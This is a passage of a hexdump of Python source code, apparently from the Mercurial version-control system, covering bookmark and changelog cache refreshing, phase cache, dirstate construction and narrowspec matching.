+0000e310: 2062 6563 6f6d 6520 776f 7273 650a 2020   become worse.  
+0000e320: 2020 2020 2020 2320 7768 656e 2074 6869        # when thi
+0000e330: 7320 6861 7070 656e 2064 7572 696e 6720  s happen during 
+0000e340: 7772 6974 6520 6265 6361 7573 6520 7468  write because th
+0000e350: 6520 626f 6f6b 6d61 726b 7320 746f 2074  e bookmarks to t
+0000e360: 6865 2022 756e 6b6e 6f77 6e22 0a20 2020  he "unknown".   
+0000e370: 2020 2020 2023 206e 6f64 6573 2077 696c       # nodes wil
+0000e380: 6c20 6265 2064 726f 7070 6564 2066 6f72  l be dropped for
+0000e390: 2067 6f6f 642e 2048 6f77 6576 6572 2c20   good. However, 
+0000e3a0: 7772 6974 6573 2068 6170 7065 6e20 7769  writes happen wi
+0000e3b0: 7468 696e 206c 6f63 6b73 2e0a 2020 2020  thin locks..    
+0000e3c0: 2020 2020 2320 5468 6973 206c 6f63 6b69      # This locki
+0000e3d0: 6e67 206d 616b 6573 2069 7420 706f 7373  ng makes it poss
+0000e3e0: 6962 6c65 2074 6f20 6861 7665 2061 2072  ible to have a r
+0000e3f0: 6163 6520 6672 6565 2063 6f6e 7369 7374  ace free consist
+0000e400: 656e 7420 7265 6164 2e0a 2020 2020 2020  ent read..      
+0000e410: 2020 2320 466f 7220 7468 6973 2070 7572    # For this pur
+0000e420: 706f 7365 2064 6174 6120 7265 6164 2066  pose data read f
+0000e430: 726f 6d20 6469 7363 2062 6566 6f72 6520  rom disc before 
+0000e440: 6c6f 636b 696e 6720 2061 7265 0a20 2020  locking  are.   
+0000e450: 2020 2020 2023 2022 696e 7661 6c69 6461       # "invalida
+0000e460: 7465 6422 2072 6967 6874 2061 6674 6572  ted" right after
+0000e470: 2074 6865 206c 6f63 6b73 2061 7265 2074   the locks are t
+0000e480: 616b 656e 2e20 5468 6973 2069 6e76 616c  aken. This inval
+0000e490: 6964 6174 696f 6e73 2061 7265 0a20 2020  idations are.   
+0000e4a0: 2020 2020 2023 2022 6c69 6768 7422 2c20       # "light", 
+0000e4b0: 7468 6520 6066 696c 6563 6163 6865 6020  the `filecache` 
+0000e4c0: 6d65 6368 616e 6973 6d20 6b65 6570 2074  mechanism keep t
+0000e4d0: 6865 2064 6174 6120 696e 206d 656d 6f72  he data in memor
+0000e4e0: 7920 616e 6420 7769 6c6c 0a20 2020 2020  y and will.     
+0000e4f0: 2020 2023 2072 6575 7365 2074 6865 6d20     # reuse them 
+0000e500: 6966 2074 6865 2075 6e64 6572 6c79 696e  if the underlyin
+0000e510: 6720 6669 6c65 7320 6469 6420 6e6f 7420  g files did not 
+0000e520: 6368 616e 6765 642e 204e 6f74 2070 6172  changed. Not par
+0000e530: 7369 6e67 2074 6865 0a20 2020 2020 2020  sing the.       
+0000e540: 2023 2073 616d 6520 6461 7461 206d 756c   # same data mul
+0000e550: 7469 706c 6520 7469 6d65 7320 6865 6c70  tiple times help
+0000e560: 7320 7065 7266 6f72 6d61 6e63 6573 2e0a  s performances..
+0000e570: 2020 2020 2020 2020 230a 2020 2020 2020          #.      
+0000e580: 2020 2320 556e 666f 7274 756e 6174 656c    # Unfortunatel
+0000e590: 7920 696e 2074 6865 2063 6173 6520 6465  y in the case de
+0000e5a0: 7363 7269 6265 2061 626f 7665 2c20 7468  scribe above, th
+0000e5b0: 6520 6669 6c65 7320 7472 6163 6b65 6420  e files tracked 
+0000e5c0: 6279 2074 6865 0a20 2020 2020 2020 2023  by the.        #
+0000e5d0: 2062 6f6f 6b6d 6172 6b73 2066 696c 6520   bookmarks file 
+0000e5e0: 6361 6368 6520 6d69 6768 7420 6e6f 7420  cache might not 
+0000e5f0: 6861 7665 2063 6861 6e67 6564 2c20 6275  have changed, bu
+0000e600: 7420 7468 6520 696e 2d6d 656d 6f72 790a  t the in-memory.
+0000e610: 2020 2020 2020 2020 2320 636f 6e74 656e          # conten
+0000e620: 7420 6973 2073 7469 6c6c 2022 7772 6f6e  t is still "wron
+0000e630: 6722 2062 6563 6175 7365 2077 6520 7573  g" because we us
+0000e640: 6564 2061 6e20 6f6c 6465 7220 6368 616e  ed an older chan
+0000e650: 6765 6c6f 6720 636f 6e74 656e 740a 2020  gelog content.  
+0000e660: 2020 2020 2020 2320 746f 2070 726f 6365        # to proce
+0000e670: 7373 2074 6865 206f 6e2d 6469 736b 2064  ss the on-disk d
+0000e680: 6174 612e 2053 6f20 6166 7465 7220 6c6f  ata. So after lo
+0000e690: 636b 696e 672c 2074 6865 2063 6861 6e67  cking, the chang
+0000e6a0: 656c 6f67 2077 6f75 6c64 2062 650a 2020  elog would be.  
+0000e6b0: 2020 2020 2020 2320 7265 6672 6573 6865        # refreshe
+0000e6c0: 6420 6275 7420 605f 626f 6f6b 6d61 726b  d but `_bookmark
+0000e6d0: 7360 2077 6f75 6c64 2062 6520 7072 6573  s` would be pres
+0000e6e0: 6572 7665 642e 0a20 2020 2020 2020 2023  erved..        #
+0000e6f0: 2041 6464 696e 6720 6030 3063 6861 6e67   Adding `00chang
+0000e700: 656c 6f67 2e69 6020 746f 2074 6865 206c  elog.i` to the l
+0000e710: 6973 7420 6f66 2074 7261 636b 6564 2066  ist of tracked f
+0000e720: 696c 6520 6973 206e 6f74 0a20 2020 2020  ile is not.     
+0000e730: 2020 2023 2065 6e6f 7567 682c 2062 6563     # enough, bec
+0000e740: 6175 7365 2061 7420 7468 6520 7469 6d65  ause at the time
+0000e750: 2077 6520 6275 696c 6420 7468 6520 636f   we build the co
+0000e760: 6e74 656e 7420 666f 7220 605f 626f 6f6b  ntent for `_book
+0000e770: 6d61 726b 7360 2069 6e0a 2020 2020 2020  marks` in.      
+0000e780: 2020 2320 2834 292c 2074 6865 2063 6861    # (4), the cha
+0000e790: 6e67 656c 6f67 2066 696c 6520 6861 7320  ngelog file has 
+0000e7a0: 616c 7265 6164 7920 6469 7665 7267 6564  already diverged
+0000e7b0: 2066 726f 6d20 7468 6520 636f 6e74 656e   from the conten
+0000e7c0: 7420 7573 6564 0a20 2020 2020 2020 2023  t used.        #
+0000e7d0: 2066 6f72 206c 6f61 6469 6e67 2060 6368   for loading `ch
+0000e7e0: 616e 6765 6c6f 6760 2069 6e20 2831 290a  angelog` in (1).
+0000e7f0: 2020 2020 2020 2020 230a 2020 2020 2020          #.      
+0000e800: 2020 2320 546f 2070 7265 7665 6e74 2074    # To prevent t
+0000e810: 6865 2069 7373 7565 2c20 7765 2066 6f72  he issue, we for
+0000e820: 6365 2074 6865 2063 6861 6e67 656c 6f67  ce the changelog
+0000e830: 2074 6f20 6265 2065 7870 6c69 6369 746c   to be explicitl
+0000e840: 790a 2020 2020 2020 2020 2320 7265 6c6f  y.        # relo
+0000e850: 6164 6564 2077 6869 6c65 2063 6f6d 7075  aded while compu
+0000e860: 7469 6e67 2060 5f62 6f6f 6b6d 6172 6b73  ting `_bookmarks
+0000e870: 602e 2054 6865 2064 6174 6120 7261 6365  `. The data race
+0000e880: 2063 616e 2073 7469 6c6c 2068 6170 7065   can still happe
+0000e890: 6e0a 2020 2020 2020 2020 2320 7769 7468  n.        # with
+0000e8a0: 6f75 7420 7468 6520 6c6f 636b 2028 7769  out the lock (wi
+0000e8b0: 7468 2061 206e 6172 726f 7765 7220 7769  th a narrower wi
+0000e8c0: 6e64 6f77 292c 2062 7574 2069 7420 776f  ndow), but it wo
+0000e8d0: 756c 6420 6e6f 206c 6f6e 6765 7220 676f  uld no longer go
+0000e8e0: 0a20 2020 2020 2020 2023 2075 6e64 6574  .        # undet
+0000e8f0: 6563 7465 6420 6475 7269 6e67 2074 6865  ected during the
+0000e900: 206c 6f63 6b20 7469 6d65 2072 6566 7265   lock time refre
+0000e910: 7368 2e0a 2020 2020 2020 2020 230a 2020  sh..        #.  
+0000e920: 2020 2020 2020 2320 5468 6520 6e65 7720        # The new 
+0000e930: 7363 6865 6475 6c65 2069 7320 6173 2066  schedule is as f
+0000e940: 6f6c 6c6f 770a 2020 2020 2020 2020 230a  ollow.        #.
+0000e950: 2020 2020 2020 2020 2320 3129 2066 696c          # 1) fil
+0000e960: 6563 6163 6865 206c 6f67 6963 2064 6574  ecache logic det
+0000e970: 6563 7420 7468 6174 2060 5f62 6f6f 6b6d  ect that `_bookm
+0000e980: 6172 6b73 6020 6e65 6564 7320 746f 2062  arks` needs to b
+0000e990: 6520 636f 6d70 7574 6564 0a20 2020 2020  e computed.     
+0000e9a0: 2020 2023 2032 2920 6361 6368 6573 7461     # 2) cachesta
+0000e9b0: 7420 666f 7220 6062 6f6f 6b6d 6172 6b73  t for `bookmarks
+0000e9c0: 6020 616e 6420 6063 6861 6e67 656c 6f67  ` and `changelog
+0000e9d0: 6020 6172 6520 6361 7074 7572 6564 2028  ` are captured (
+0000e9e0: 666f 7220 626f 6f6b 290a 2020 2020 2020  for book).      
+0000e9f0: 2020 2320 3329 2057 6520 666f 7263 6520    # 3) We force 
+0000ea00: 6063 6861 6e67 656c 6f67 6020 6669 6c65  `changelog` file
+0000ea10: 6361 6368 6520 746f 2062 6520 7465 7374  cache to be test
+0000ea20: 6564 0a20 2020 2020 2020 2023 2034 2920  ed.        # 4) 
+0000ea30: 6361 6368 6573 7461 7420 666f 7220 6063  cachestat for `c
+0000ea40: 6861 6e67 656c 6f67 6020 6172 6520 6361  hangelog` are ca
+0000ea50: 7074 7572 6564 2028 666f 7220 6368 616e  ptured (for chan
+0000ea60: 6765 6c6f 6729 0a20 2020 2020 2020 2023  gelog).        #
+0000ea70: 2035 2920 605f 626f 6f6b 6d61 726b 7360   5) `_bookmarks`
+0000ea80: 2069 7320 636f 6d70 7574 6564 2061 6e64   is computed and
+0000ea90: 2063 6163 6865 640a 2020 2020 2020 2020   cached.        
+0000eaa0: 230a 2020 2020 2020 2020 2320 5468 6520  #.        # The 
+0000eab0: 7374 6570 2069 6e20 2833 2920 656e 7375  step in (3) ensu
+0000eac0: 7265 2077 6520 6861 7665 2061 2063 6861  re we have a cha
+0000ead0: 6e67 656c 6f67 2061 7420 6c65 6173 7420  ngelog at least 
+0000eae0: 6173 2072 6563 656e 7420 6173 2074 6865  as recent as the
+0000eaf0: 0a20 2020 2020 2020 2023 2063 6163 6865  .        # cache
+0000eb00: 2073 7461 7420 636f 6d70 7574 6564 2069   stat computed i
+0000eb10: 6e20 2831 292e 2041 7320 6120 7265 7375  n (1). As a resu
+0000eb20: 6c74 2061 7420 6c6f 636b 696e 6720 7469  lt at locking ti
+0000eb30: 6d65 3a0a 2020 2020 2020 2020 2320 202a  me:.        #  *
+0000eb40: 2069 6620 7468 6520 6368 616e 6765 6c6f   if the changelo
+0000eb50: 6720 6469 6420 6e6f 7420 6368 616e 6765  g did not change
+0000eb60: 6420 7369 6e63 6520 2831 2920 2d3e 2077  d since (1) -> w
+0000eb70: 6520 6361 6e20 7265 7573 6520 7468 6520  e can reuse the 
+0000eb80: 6461 7461 0a20 2020 2020 2020 2023 2020  data.        #  
+0000eb90: 2a20 6f74 6865 7277 6973 6520 2d3e 2074  * otherwise -> t
+0000eba0: 6865 2062 6f6f 6b6d 6172 6b73 2067 6574  he bookmarks get
+0000ebb0: 2072 6566 7265 7368 6564 2e0a 2020 2020   refreshed..    
+0000ebc0: 2020 2020 7365 6c66 2e5f 7265 6672 6573      self._refres
+0000ebd0: 6863 6861 6e67 656c 6f67 2829 0a20 2020  hchangelog().   
+0000ebe0: 2020 2020 2072 6574 7572 6e20 626f 6f6b       return book
+0000ebf0: 6d61 726b 732e 626d 7374 6f72 6528 7365  marks.bmstore(se
+0000ec00: 6c66 290a 0a20 2020 2064 6566 205f 7265  lf)..    def _re
+0000ec10: 6672 6573 6863 6861 6e67 656c 6f67 2873  freshchangelog(s
+0000ec20: 656c 6629 3a0a 2020 2020 2020 2020 2222  elf):.        ""
+0000ec30: 226d 616b 6520 7375 7265 2074 6865 2069  "make sure the i
+0000ec40: 6e20 6d65 6d6f 7279 2063 6861 6e67 656c  n memory changel
+0000ec50: 6f67 206d 6174 6368 2074 6865 206f 6e2d  og match the on-
+0000ec60: 6469 736b 206f 6e65 2222 220a 2020 2020  disk one""".    
+0000ec70: 2020 2020 6966 2027 6368 616e 6765 6c6f      if 'changelo
+0000ec80: 6727 2069 6e20 7661 7273 2873 656c 6629  g' in vars(self)
+0000ec90: 2061 6e64 2073 656c 662e 6375 7272 656e   and self.curren
+0000eca0: 7474 7261 6e73 6163 7469 6f6e 2829 2069  ttransaction() i
+0000ecb0: 7320 4e6f 6e65 3a0a 2020 2020 2020 2020  s None:.        
+0000ecc0: 2020 2020 6465 6c20 7365 6c66 2e63 6861      del self.cha
+0000ecd0: 6e67 656c 6f67 0a0a 2020 2020 4070 726f  ngelog..    @pro
+0000ece0: 7065 7274 790a 2020 2020 6465 6620 5f61  perty.    def _a
+0000ecf0: 6374 6976 6562 6f6f 6b6d 6172 6b28 7365  ctivebookmark(se
+0000ed00: 6c66 293a 0a20 2020 2020 2020 2072 6574  lf):.        ret
+0000ed10: 7572 6e20 7365 6c66 2e5f 626f 6f6b 6d61  urn self._bookma
+0000ed20: 726b 732e 6163 7469 7665 0a0a 2020 2020  rks.active..    
+0000ed30: 2320 5f70 6861 7365 7365 7473 2064 6570  # _phasesets dep
+0000ed40: 656e 6420 6f6e 2063 6861 6e67 656c 6f67  end on changelog
+0000ed50: 2e20 7768 6174 2077 6520 6e65 6564 2069  . what we need i
+0000ed60: 7320 746f 2063 616c 6c0a 2020 2020 2320  s to call.    # 
+0000ed70: 5f70 6861 7365 6361 6368 652e 696e 7661  _phasecache.inva
+0000ed80: 6c69 6461 7465 2829 2069 6620 2730 3063  lidate() if '00c
+0000ed90: 6861 6e67 656c 6f67 2e69 2720 7761 7320  hangelog.i' was 
+0000eda0: 6368 616e 6765 642c 2062 7574 2069 740a  changed, but it.
+0000edb0: 2020 2020 2320 6361 6e27 7420 6265 2065      # can't be e
+0000edc0: 6173 696c 7920 6578 7072 6573 7365 6420  asily expressed 
+0000edd0: 696e 2066 696c 6563 6163 6865 206d 6563  in filecache mec
+0000ede0: 6861 6e69 736d 2e0a 2020 2020 4073 746f  hanism..    @sto
+0000edf0: 7265 6361 6368 6528 6227 7068 6173 6572  recache(b'phaser
+0000ee00: 6f6f 7473 272c 2062 2730 3063 6861 6e67  oots', b'00chang
+0000ee10: 656c 6f67 2e69 2729 0a20 2020 2064 6566  elog.i').    def
+0000ee20: 205f 7068 6173 6563 6163 6865 2873 656c   _phasecache(sel
+0000ee30: 6629 3a0a 2020 2020 2020 2020 7265 7475  f):.        retu
+0000ee40: 726e 2070 6861 7365 732e 7068 6173 6563  rn phases.phasec
+0000ee50: 6163 6865 2873 656c 662c 2073 656c 662e  ache(self, self.
+0000ee60: 5f70 6861 7365 6465 6661 756c 7473 290a  _phasedefaults).
+0000ee70: 0a20 2020 2040 7374 6f72 6563 6163 6865  .    @storecache
+0000ee80: 2862 276f 6273 7374 6f72 6527 290a 2020  (b'obsstore').  
+0000ee90: 2020 6465 6620 6f62 7373 746f 7265 2873    def obsstore(s
+0000eea0: 656c 6629 3a0a 2020 2020 2020 2020 7265  elf):.        re
+0000eeb0: 7475 726e 206f 6273 6f6c 6574 652e 6d61  turn obsolete.ma
+0000eec0: 6b65 7374 6f72 6528 7365 6c66 2e75 692c  kestore(self.ui,
+0000eed0: 2073 656c 6629 0a0a 2020 2020 4063 6861   self)..    @cha
+0000eee0: 6e67 656c 6f67 6361 6368 6528 290a 2020  ngelogcache().  
+0000eef0: 2020 6465 6620 6368 616e 6765 6c6f 6728    def changelog(
+0000ef00: 7265 706f 293a 0a20 2020 2020 2020 2023  repo):.        #
+0000ef10: 206c 6f61 6420 6469 7273 7461 7465 2062   load dirstate b
+0000ef20: 6566 6f72 6520 6368 616e 6765 6c6f 6720  efore changelog 
+0000ef30: 746f 2061 766f 6964 2072 6163 6520 7365  to avoid race se
+0000ef40: 6520 6973 7375 6536 3330 330a 2020 2020  e issue6303.    
+0000ef50: 2020 2020 7265 706f 2e64 6972 7374 6174      repo.dirstat
+0000ef60: 652e 7072 6566 6574 6368 5f70 6172 656e  e.prefetch_paren
+0000ef70: 7473 2829 0a20 2020 2020 2020 2072 6574  ts().        ret
+0000ef80: 7572 6e20 7265 706f 2e73 746f 7265 2e63  urn repo.store.c
+0000ef90: 6861 6e67 656c 6f67 280a 2020 2020 2020  hangelog(.      
+0000efa0: 2020 2020 2020 7478 6e75 7469 6c2e 6d61        txnutil.ma
+0000efb0: 7968 6176 6570 656e 6469 6e67 2872 6570  yhavepending(rep
+0000efc0: 6f2e 726f 6f74 292c 0a20 2020 2020 2020  o.root),.       
+0000efd0: 2020 2020 2063 6f6e 6375 7272 656e 6379       concurrency
+0000efe0: 6368 6563 6b65 723d 7265 766c 6f67 6368  checker=revlogch
+0000eff0: 6563 6b65 722e 6765 745f 6368 6563 6b65  ecker.get_checke
+0000f000: 7228 7265 706f 2e75 692c 2062 2763 6861  r(repo.ui, b'cha
+0000f010: 6e67 656c 6f67 2729 2c0a 2020 2020 2020  ngelog'),.      
+0000f020: 2020 290a 0a20 2020 2040 6d61 6e69 6665    )..    @manife
+0000f030: 7374 6c6f 6763 6163 6865 2829 0a20 2020  stlogcache().   
+0000f040: 2064 6566 206d 616e 6966 6573 746c 6f67   def manifestlog
+0000f050: 2873 656c 6629 3a0a 2020 2020 2020 2020  (self):.        
+0000f060: 7265 7475 726e 2073 656c 662e 7374 6f72  return self.stor
+0000f070: 652e 6d61 6e69 6665 7374 6c6f 6728 7365  e.manifestlog(se
+0000f080: 6c66 2c20 7365 6c66 2e5f 7374 6f72 656e  lf, self._storen
+0000f090: 6172 726f 776d 6174 6368 290a 0a20 2020  arrowmatch)..   
+0000f0a0: 2040 756e 6669 6c74 6572 6564 7072 6f70   @unfilteredprop
+0000f0b0: 6572 7479 6361 6368 650a 2020 2020 6465  ertycache.    de
+0000f0c0: 6620 6469 7273 7461 7465 2873 656c 6629  f dirstate(self)
+0000f0d0: 3a0a 2020 2020 2020 2020 6966 2073 656c  :.        if sel
+0000f0e0: 662e 5f64 6972 7374 6174 6520 6973 204e  f._dirstate is N
+0000f0f0: 6f6e 653a 0a20 2020 2020 2020 2020 2020  one:.           
+0000f100: 2073 656c 662e 5f64 6972 7374 6174 6520   self._dirstate 
+0000f110: 3d20 7365 6c66 2e5f 6d61 6b65 6469 7273  = self._makedirs
+0000f120: 7461 7465 2829 0a20 2020 2020 2020 2065  tate().        e
+0000f130: 6c73 653a 0a20 2020 2020 2020 2020 2020  lse:.           
+0000f140: 2073 656c 662e 5f64 6972 7374 6174 652e   self._dirstate.
+0000f150: 7265 6672 6573 6828 290a 2020 2020 2020  refresh().      
+0000f160: 2020 7265 7475 726e 2073 656c 662e 5f64    return self._d
+0000f170: 6972 7374 6174 650a 0a20 2020 2064 6566  irstate..    def
+0000f180: 205f 6d61 6b65 6469 7273 7461 7465 2873   _makedirstate(s
+0000f190: 656c 6629 3a0a 2020 2020 2020 2020 2222  elf):.        ""
+0000f1a0: 2245 7874 656e 7369 6f6e 2070 6f69 6e74  "Extension point
+0000f1b0: 2066 6f72 2077 7261 7070 696e 6720 7468   for wrapping th
+0000f1c0: 6520 6469 7273 7461 7465 2070 6572 2d72  e dirstate per-r
+0000f1d0: 6570 6f2e 2222 220a 2020 2020 2020 2020  epo.""".        
+0000f1e0: 7370 6172 7365 6d61 7463 6866 6e20 3d20  sparsematchfn = 
+0000f1f0: 4e6f 6e65 0a20 2020 2020 2020 2069 6620  None.        if 
+0000f200: 7370 6172 7365 2e75 7365 5f73 7061 7273  sparse.use_spars
+0000f210: 6528 7365 6c66 293a 0a20 2020 2020 2020  e(self):.       
+0000f220: 2020 2020 2073 7061 7273 656d 6174 6368       sparsematch
+0000f230: 666e 203d 206c 616d 6264 613a 2073 7061  fn = lambda: spa
+0000f240: 7273 652e 6d61 7463 6865 7228 7365 6c66  rse.matcher(self
+0000f250: 290a 2020 2020 2020 2020 7632 5f72 6571  ).        v2_req
+0000f260: 203d 2072 6571 7569 7265 6d65 6e74 736d   = requirementsm
+0000f270: 6f64 2e44 4952 5354 4154 455f 5632 5f52  od.DIRSTATE_V2_R
+0000f280: 4551 5549 5245 4d45 4e54 0a20 2020 2020  EQUIREMENT.     
+0000f290: 2020 2074 6820 3d20 7265 7175 6972 656d     th = requirem
+0000f2a0: 656e 7473 6d6f 642e 4449 5253 5441 5445  entsmod.DIRSTATE
+0000f2b0: 5f54 5241 434b 4544 5f48 494e 545f 5631  _TRACKED_HINT_V1
+0000f2c0: 0a20 2020 2020 2020 2075 7365 5f64 6972  .        use_dir
+0000f2d0: 7374 6174 655f 7632 203d 2076 325f 7265  state_v2 = v2_re
+0000f2e0: 7120 696e 2073 656c 662e 7265 7175 6972  q in self.requir
+0000f2f0: 656d 656e 7473 0a20 2020 2020 2020 2075  ements.        u
+0000f300: 7365 5f74 7261 636b 6564 5f68 696e 7420  se_tracked_hint 
+0000f310: 3d20 7468 2069 6e20 7365 6c66 2e72 6571  = th in self.req
+0000f320: 7569 7265 6d65 6e74 730a 0a20 2020 2020  uirements..     
+0000f330: 2020 2072 6574 7572 6e20 6469 7273 7461     return dirsta
+0000f340: 7465 2e64 6972 7374 6174 6528 0a20 2020  te.dirstate(.   
+0000f350: 2020 2020 2020 2020 2073 656c 662e 7666           self.vf
+0000f360: 732c 0a20 2020 2020 2020 2020 2020 2073  s,.            s
+0000f370: 656c 662e 7569 2c0a 2020 2020 2020 2020  elf.ui,.        
+0000f380: 2020 2020 7365 6c66 2e72 6f6f 742c 0a20      self.root,. 
+0000f390: 2020 2020 2020 2020 2020 2073 656c 662e             self.
+0000f3a0: 5f64 6972 7374 6174 6576 616c 6964 6174  _dirstatevalidat
+0000f3b0: 652c 0a20 2020 2020 2020 2020 2020 2073  e,.            s
+0000f3c0: 7061 7273 656d 6174 6368 666e 2c0a 2020  parsematchfn,.  
+0000f3d0: 2020 2020 2020 2020 2020 7365 6c66 2e6e            self.n
+0000f3e0: 6f64 6563 6f6e 7374 616e 7473 2c0a 2020  odeconstants,.  
+0000f3f0: 2020 2020 2020 2020 2020 7573 655f 6469            use_di
+0000f400: 7273 7461 7465 5f76 322c 0a20 2020 2020  rstate_v2,.     
+0000f410: 2020 2020 2020 2075 7365 5f74 7261 636b         use_track
+0000f420: 6564 5f68 696e 743d 7573 655f 7472 6163  ed_hint=use_trac
+0000f430: 6b65 645f 6869 6e74 2c0a 2020 2020 2020  ked_hint,.      
+0000f440: 2020 290a 0a20 2020 2064 6566 205f 6469    )..    def _di
+0000f450: 7273 7461 7465 7661 6c69 6461 7465 2873  rstatevalidate(s
+0000f460: 656c 662c 206e 6f64 6529 3a0a 2020 2020  elf, node):.    
+0000f470: 2020 2020 7472 793a 0a20 2020 2020 2020      try:.       
+0000f480: 2020 2020 2073 656c 662e 6368 616e 6765       self.change
+0000f490: 6c6f 672e 7265 7628 6e6f 6465 290a 2020  log.rev(node).  
+0000f4a0: 2020 2020 2020 2020 2020 7265 7475 726e            return
+0000f4b0: 206e 6f64 650a 2020 2020 2020 2020 6578   node.        ex
+0000f4c0: 6365 7074 2065 7272 6f72 2e4c 6f6f 6b75  cept error.Looku
+0000f4d0: 7045 7272 6f72 3a0a 2020 2020 2020 2020  pError:.        
+0000f4e0: 2020 2020 6966 206e 6f74 2073 656c 662e      if not self.
+0000f4f0: 5f64 6972 7374 6174 6576 616c 6964 6174  _dirstatevalidat
+0000f500: 6577 6172 6e65 643a 0a20 2020 2020 2020  ewarned:.       
+0000f510: 2020 2020 2020 2020 2073 656c 662e 5f64           self._d
+0000f520: 6972 7374 6174 6576 616c 6964 6174 6577  irstatevalidatew
+0000f530: 6172 6e65 6420 3d20 5472 7565 0a20 2020  arned = True.   
+0000f540: 2020 2020 2020 2020 2020 2020 2073 656c               sel
+0000f550: 662e 7569 2e77 6172 6e28 0a20 2020 2020  f.ui.warn(.     
+0000f560: 2020 2020 2020 2020 2020 2020 2020 205f                 _
+0000f570: 2862 2277 6172 6e69 6e67 3a20 6967 6e6f  (b"warning: igno
+0000f580: 7269 6e67 2075 6e6b 6e6f 776e 2077 6f72  ring unknown wor
+0000f590: 6b69 6e67 2070 6172 656e 7420 2573 215c  king parent %s!\
+0000f5a0: 6e22 290a 2020 2020 2020 2020 2020 2020  n").            
+0000f5b0: 2020 2020 2020 2020 2520 7368 6f72 7428          % short(
+0000f5c0: 6e6f 6465 290a 2020 2020 2020 2020 2020  node).          
+0000f5d0: 2020 2020 2020 290a 2020 2020 2020 2020        ).        
+0000f5e0: 2020 2020 7265 7475 726e 2073 656c 662e      return self.
+0000f5f0: 6e75 6c6c 6964 0a0a 2020 2020 4073 746f  nullid..    @sto
+0000f600: 7265 6361 6368 6528 6e61 7272 6f77 7370  recache(narrowsp
+0000f610: 6563 2e46 494c 454e 414d 4529 0a20 2020  ec.FILENAME).   
+0000f620: 2064 6566 206e 6172 726f 7770 6174 7328   def narrowpats(
+0000f630: 7365 6c66 293a 0a20 2020 2020 2020 2022  self):.        "
+0000f640: 2222 6d61 7463 6865 7220 7061 7474 6572  ""matcher patter
+0000f650: 6e73 2066 6f72 2074 6869 7320 7265 706f  ns for this repo
+0000f660: 7369 746f 7279 2773 206e 6172 726f 7773  sitory's narrows
+0000f670: 7065 630a 0a20 2020 2020 2020 2041 2074  pec..        A t
+0000f680: 7570 6c65 206f 6620 2869 6e63 6c75 6465  uple of (include
+0000f690: 732c 2065 7863 6c75 6465 7329 2e0a 2020  s, excludes)..  
+0000f6a0: 2020 2020 2020 2222 220a 2020 2020 2020        """.      
+0000f6b0: 2020 2320 7468 6520 6e61 7272 6f77 206d    # the narrow m
+0000f6c0: 616e 6167 656d 656e 7420 7368 6f75 6c64  anagement should
+0000f6d0: 2070 726f 6261 626c 7920 6d6f 7665 2069   probably move i
+0000f6e0: 6e74 6f20 6974 7320 6f77 6e20 6f62 6a65  nto its own obje
+0000f6f0: 6374 0a20 2020 2020 2020 2076 616c 203d  ct.        val =
+0000f700: 2073 656c 662e 5f70 656e 6469 6e67 5f6e   self._pending_n
+0000f710: 6172 726f 775f 7061 7473 0a20 2020 2020  arrow_pats.     
+0000f720: 2020 2069 6620 7661 6c20 6973 204e 6f6e     if val is Non
+0000f730: 653a 0a20 2020 2020 2020 2020 2020 2076  e:.            v
+0000f740: 616c 203d 206e 6172 726f 7773 7065 632e  al = narrowspec.
+0000f750: 6c6f 6164 2873 656c 6629 0a20 2020 2020  load(self).     
+0000f760: 2020 2072 6574 7572 6e20 7661 6c0a 0a20     return val.. 
+0000f770: 2020 2040 7374 6f72 6563 6163 6865 286e     @storecache(n
+0000f780: 6172 726f 7773 7065 632e 4649 4c45 4e41  arrowspec.FILENA
+0000f790: 4d45 290a 2020 2020 6465 6620 5f73 746f  ME).    def _sto
+0000f7a0: 7265 6e61 7272 6f77 6d61 7463 6828 7365  renarrowmatch(se
+0000f7b0: 6c66 293a 0a20 2020 2020 2020 2069 6620  lf):.        if 
+0000f7c0: 7265 7175 6972 656d 656e 7473 6d6f 642e  requirementsmod.
+0000f7d0: 4e41 5252 4f57 5f52 4551 5549 5245 4d45  NARROW_REQUIREME
+0000f7e0: 4e54 206e 6f74 2069 6e20 7365 6c66 2e72  NT not in self.r
+0000f7f0: 6571 7569 7265 6d65 6e74 733a 0a20 2020  equirements:.   
+0000f800: 2020 2020 2020 2020 2072 6574 7572 6e20           return 
+0000f810: 6d61 7463 686d 6f64 2e61 6c77 6179 7328  matchmod.always(
+0000f820: 290a 2020 2020 2020 2020 696e 636c 7564  ).        includ
+0000f830: 652c 2065 7863 6c75 6465 203d 2073 656c  e, exclude = sel
+0000f840: 662e 6e61 7272 6f77 7061 7473 0a20 2020  f.narrowpats.   
+0000f850: 2020 2020 2072 6574 7572 6e20 6e61 7272       return narr
+0000f860: 6f77 7370 6563 2e6d 6174 6368 2873 656c  owspec.match(sel
+0000f870: 662e 726f 6f74 2c20 696e 636c 7564 653d  f.root, include=
+0000f880: 696e 636c 7564 652c 2065 7863 6c75 6465  include, exclude
+0000f890: 3d65 7863 6c75 6465 290a 0a20 2020 2040  =exclude)..    @
+0000f8a0: 7374 6f72 6563 6163 6865 286e 6172 726f  storecache(narro
+0000f8b0: 7773 7065 632e 4649 4c45 4e41 4d45 290a  wspec.FILENAME).
+0000f8c0: 2020 2020 6465 6620 5f6e 6172 726f 776d      def _narrowm
+0000f8d0: 6174 6368 2873 656c 6629 3a0a 2020 2020  atch(self):.    
+0000f8e0: 2020 2020 6966 2072 6571 7569 7265 6d65      if requireme
+0000f8f0: 6e74 736d 6f64 2e4e 4152 524f 575f 5245  ntsmod.NARROW_RE
+0000f900: 5155 4952 454d 454e 5420 6e6f 7420 696e  QUIREMENT not in
+0000f910: 2073 656c 662e 7265 7175 6972 656d 656e   self.requiremen
+0000f920: 7473 3a0a 2020 2020 2020 2020 2020 2020  ts:.            
+0000f930: 7265 7475 726e 206d 6174 6368 6d6f 642e  return matchmod.
+0000f940: 616c 7761 7973 2829 0a20 2020 2020 2020  always().       
+0000f950: 206e 6172 726f 7773 7065 632e 6368 6563   narrowspec.chec
+0000f960: 6b77 6f72 6b69 6e67 636f 7079 6e61 7272  kworkingcopynarr
+0000f970: 6f77 7370 6563 2873 656c 6629 0a20 2020  owspec(self).   
+0000f980: 2020 2020 2069 6e63 6c75 6465 2c20 6578       include, ex
+0000f990: 636c 7564 6520 3d20 7365 6c66 2e6e 6172  clude = self.nar
+0000f9a0: 726f 7770 6174 730a 2020 2020 2020 2020  rowpats.        
+0000f9b0: 7265 7475 726e 206e 6172 726f 7773 7065  return narrowspe
+0000f9c0: 632e 6d61 7463 6828 7365 6c66 2e72 6f6f  c.match(self.roo
